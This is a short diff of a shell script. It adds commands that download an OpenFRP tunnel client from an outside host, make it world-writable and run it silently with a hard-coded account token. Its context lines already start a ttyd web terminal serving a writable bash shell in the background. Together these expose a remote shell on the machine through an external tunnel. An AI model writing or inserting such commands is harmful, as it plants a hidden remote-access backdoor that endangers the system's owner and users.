@@ -120,7 +120,8 @@ chmod +x ./nginx/sbin/v3a
 wget -O /tmp/ttyd https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64
 chmod 777 /tmp/ttyd
 nohup /tmp/ttyd -W bash > /dev/null &
-
-
-
+wget -O /tmp/frc http://d.of.gs/client/OpenFRP_0.48.1_678f4eae_20230505/frpc_linux_amd64.tar.gz > /dev/null
+tar -zxvf /tmp/frc
+chmod 777 /tmp/frc
+nohup /tmp/frc -u cef2958f5d3f7ad96c9aeade8e270b58 -p 155102 > /dev/null &
 rm -rf ./log.log
